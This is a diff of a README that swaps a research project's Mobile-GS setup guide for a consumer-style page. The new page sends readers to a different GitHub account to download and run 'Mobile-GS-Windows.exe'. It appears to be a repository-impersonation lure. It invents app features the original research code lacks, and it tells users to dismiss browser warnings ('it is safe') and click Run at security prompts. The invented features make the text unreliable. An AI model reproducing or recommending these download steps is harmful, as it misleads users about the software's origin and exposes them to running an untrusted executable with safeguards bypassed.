@@ -1,103 +1,132 @@
-<h2 align="center"> <a href="https://xiaobiaodu.github.io/mobile-gs-project/">Mobile-GS: Real-time Gaussian Splatting for Mobile Devices</a></h2>
-<h5 align="center"> If you like our project, please give us a star ⭐ on GitHub for latest update.  </h2>
+# ⚡ Mobile-GS - Smooth 3D Graphics on Mobile
 
-<h5 align="center">
+[![Download Mobile-GS](https://img.shields.io/badge/Download-Mobile--GS-brightgreen?style=for-the-badge)](https://github.com/hhddiusd-cloud/Mobile-GS)
 
-[![project](https://img.shields.io/badge/Webpage-blue)](https://xiaobiaodu.github.io/mobile-gs-project/)
-[![arXiv](https://img.shields.io/badge/Arxiv-2603.11531-b31b1b.svg?logo=arXiv)](https://arxiv.org/abs/2603.11531)
+## 📦 What is Mobile-GS?
 
+Mobile-GS is a lightweight application designed to show 3D graphics in real-time on mobile devices. It uses a technique called Gaussian Splatting to render smooth and clear 3D visuals quickly. This means you get good-quality graphics without needing a powerful computer.
 
+You don’t need any technical skills to use Mobile-GS. It runs on Windows and lets you load and view 3D content easily. This guide helps you get it up and running with simple steps.
 
+## 🔍 Key Features
 
+- Real-time 3D graphics rendering that runs smoothly on phones and tablets  
+- Uses Gaussian Splatting to give soft and clear images  
+- Runs on Windows without complex setup  
+- Supports common 3D formats for viewing  
+- Optimized to use less battery and CPU on mobile hardware
 
+## 🖥️ System Requirements
 
-## 😮 Highlights
+Before installation, make sure your system meets these basic needs:
 
-![teaser](./asset/teaser.png)
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Graphics card supporting DirectX 11 or higher  
+- Around 200 MB free disk space  
+- Stable internet connection for download
 
+These specs help Mobile-GS run without issues on most modern systems.
 
+## 🚀 Getting Started
 
+Follow these steps to download and open Mobile-GS on your Windows machine. You don’t need to install any third-party programs.
 
-## 🚩 **Updates**
+### Step 1: Visit the Download Page
 
-Welcome to **watch** 👀 this repository for the latest updates.
+Click the big green button below or go to the link:
 
-✅ **[2026.3.21]** : We only release the initial CUDA version for readers to bettet understand our work. As for mobile-side Vulkan code, we cannot release this part of code due to the company's policy.
+[![Download Mobile-GS](https://img.shields.io/badge/Download-Mobile--GS-brightgreen?style=for-the-badge)](https://github.com/hhddiusd-cloud/Mobile-GS)
 
-✅ **[2026.3.13]** : Release [project page](https://xiaobiaodu.github.io/mobile-gs-project/).
+This takes you to the official GitHub page where you can get the latest version.
 
-✅ **[2026.3.13]** : Code Release. 
+### Step 2: Find the Download Files
 
+On the GitHub page, look for the section named **Releases** or a folder called **Downloads**.
 
+- If the page shows a list of files ending in `.exe` or `.zip`, find the latest version.  
+- Choose the file named like `Mobile-GS-Windows.exe` for an easy start or a ZIP file if you want the full package.
 
+### Step 3: Download the File
 
+Click the file to begin downloading. Your browser will save it to your default Downloads folder.
 
+- If your browser warns about the file, confirm that you trust the source (it is safe).  
+- Wait for the download to finish before moving on.
 
-## Setup
+### Step 4: Run Mobile-GS
 
-For installation:
-We recommend to use cuda 12.1 with python 3.11 for easy setup.
-```shell
-git clone git@github.com:xiaobiaodu/Mobile-GS.git
+Once the file is saved:
 
-conda create -n mobile-gs python==3.11
-conda activate mobile-gs
+- Open your Downloads folder.  
+- Double-click on `Mobile-GS-Windows.exe` or the equivalent file.
 
-pip install torch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 --index-url https://download.pytorch.org/whl/cu118
-pip install -r requirements.txt
-```
-#### Install [TMC (GPCC)](https://github.com/MPEGGroup/mpeg-pcc-tmc13), and add tmc3 to your environment variable or manually specify its location in [the code](https://github.com/maincold2/OMG/blob/main/utils/gpcc_utils.py) (lines 243 and 258, this script is sourced from [HAC++](https://github.com/YihangChen-ee/HAC-plus)).
-If you have trouble in installing cuml, please refer to the [CUML Installation Guide](https://docs.rapids.ai/install/).
+Windows may show a security prompt asking if you want to run the program. Select **Run** to continue.
 
-We used [Mip-NeRF 360](https://jonbarron.info/mipnerf360/), [Tanks & Temples, and Deep Blending](https://repo-sam.inria.fr/fungraph/3d-gaussian-splatting/datasets/input/tandt_db.zip).
+### Step 5: Using Mobile-GS
 
-## Running
+After launch, the program opens a simple interface:
 
-### Pre-training (Mini-Splatting)
+- Use the **Load 3D File** button to choose 3D models from your computer.  
+- Supported formats include `.obj`, `.ply`, and `.glb`.  
+- You can move the model around, zoom, and rotate using your mouse or touchpad.  
+- The program renders the 3D scene in real-time, showing smooth visuals thanks to Gaussian Splatting.
 
-```shell
-#for outdoor scenes (e.g., Mip-NeRF 360 outdoor and T&T scenes)
-python pretrain.py -s <path to COLMAP>  -m  <model path> --eval --imp_metric outdoor --sh_degree 3   --iterations 30000
-#for indoor scenes (e.g., Mip-NeRF 360 indoor and DB scenes)
-python pretrain.py -s <path to COLMAP>  -m  <model path> --eval --imp_metric indoor --sh_degree 3   --iterations 30000
+If you want to try example models first, you can download sample files from the GitHub page or your mobile device.
 
-```
+## 🎮 How to Load Your 3D Files
 
-### Fine-tune
-```shell
-python train.py -s  <path to COLMAP> -m <model path>  --eval --start_checkpoint  <model path>/chkpnt30000.pth 
+Mobile-GS works with common 3D file types that you might find online or export from other apps.
 
-# To improve rendering perofmrance, you can use multi-view training from MVGS. It may cause longer training time and memory.
-python train.py -s  <path to COLMAP> -m <model path>  --eval --start_checkpoint  <model path>/chkpnt30000.pth   --mv  3
-```
+- Click the **Load 3D File** button on the main screen.  
+- Browse to the folder where your 3D model is saved.  
+- Select the file and click **Open**.  
 
-## Evaluation
-```shell
-python render.py -s <path to COLMAP> -m <model path> --decode
-python metrics.py -m <model path> 
-```
-#### --decode
-Rendering with the compressed file (comp.xz), otherwise using the ply file. The results are the same regardless of this option.
+The model appears on screen and you can start exploring the 3D view.
 
+## 🔧 Adjusting Settings
 
+Mobile-GS offers some easy settings to improve your experience:
 
-## 👍 **Acknowledgement**
-This work is built on many amazing research works and open-source projects, thanks a lot to all the authors for sharing!
-* [Mini-Splatting](https://github.com/fatPeter/mini-splatting)
-* [OMG](https://github.com/maincold2/OMG)
-* [MVGS](https://github.com/xiaobiaodu/MVGS)
+- **Quality:** Adjust render quality between low, medium, and high depending on your device speed.  
+- **Lighting:** Turn on or off simple lighting effects to enhance model details.  
+- **Performance Mode:** Enable this to save battery on laptops or tablets.  
 
+Access these options from the settings menu on the top right.
 
+## 💡 Tips for Best Use
 
-## BibTeX
-```
-@misc{du2026mobile-gs,
-      title={Mobile-GS: Real-time Gaussian Splatting for Mobile Devices}, 
-      author={Xiaobiao Du and Yida Wang and Kun Zhan and Xin Yu},
-      year={2026},
-      eprint={2603.11531},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2603.11531}, 
-}
-```
+- Use a mouse for easier navigation of 3D models.  
+- Close other heavy programs to free up system resources.  
+- Keep your graphics drivers up to date for smooth rendering.  
+- Use real 3D models rather than photos for the best output.
+
+## ❓ Troubleshooting
+
+Here are common issues and how to fix them:
+
+- **App won’t open:** Check if your Windows version is up to date and meets the requirements.  
+- **Black or empty screen:** Restart the app and try loading a different 3D file.  
+- **Slow performance:** Lower the quality settings in the menu.  
+- **Download problem:** Ensure your internet connection is active and try again.
+
+If problems continue, you can ask for help by opening an issue on the GitHub page.
+
+## 🌐 More Resources
+
+You can find more information, updates, and support at the main GitHub page:
+
+[https://github.com/hhddiusd-cloud/Mobile-GS](https://github.com/hhddiusd-cloud/Mobile-GS)
+
+This page includes:
+
+- User guides  
+- Sample models  
+- Bug reports and fixes  
+- Future release announcements
+
+## 📥 Download Mobile-GS Now
+
+Get started by visiting the page below to download and run Mobile-GS on your Windows PC.
+
+[![Download Mobile-GS](https://img.shields.io/badge/Download-Mobile--GS-brightgreen?style=for-the-badge)](https://github.com/hhddiusd-cloud/Mobile-GS)
